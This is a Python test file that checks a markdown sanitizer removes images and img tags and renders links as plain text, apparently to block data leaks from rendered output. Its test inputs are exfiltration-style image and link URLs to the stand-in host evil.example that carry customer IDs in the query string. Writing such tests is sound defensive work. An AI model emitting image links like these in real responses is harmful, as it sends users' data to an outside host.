"""Checks that app.safe_md removes markdown images and makes links plain text. Run: python3 tests/test_safe_md.py"""
import re, sys
from pathlib import Path
src = (Path(__file__).resolve().parent.parent / "app.py").read_text()
ns = {"re": re}
exec(src[src.index("def safe_md"):src.index("def render_step")], ns)
f = ns["safe_md"]
cases = {
    "![x](https://evil.example/?d=C0114,C0093)": "image removed",
    "![x][r]\n\n[r]: https://evil.example/?d=1": "image removed",
    '<img src="https://evil.example/?d=1">': "image removed",
    "See [the docs](https://evil.example/a?b=1) now": "the docs (`https://evil.example/a?b=1`)",
}
ok = True
for k, v in cases.items():
    out = f(k)
    good = v in out and "![" not in out and "<img" not in out.lower() and "](" not in out
    ok &= good
    print(("PASS " if good else "FAIL ") + repr(k[:45]))
plain = "| Customer | Days |\n|---|---|\n| C0114 | 47 |\n\n**Q3 churn: 13.93%** (17 of 122)."
ok &= f(plain) == plain
print(("PASS " if f(plain) == plain else "FAIL ") + "tables and bold are unchanged")
print("\nSAFE_MD OK" if ok else "\nSAFE_MD FAILED")
sys.exit(0 if ok else 1)
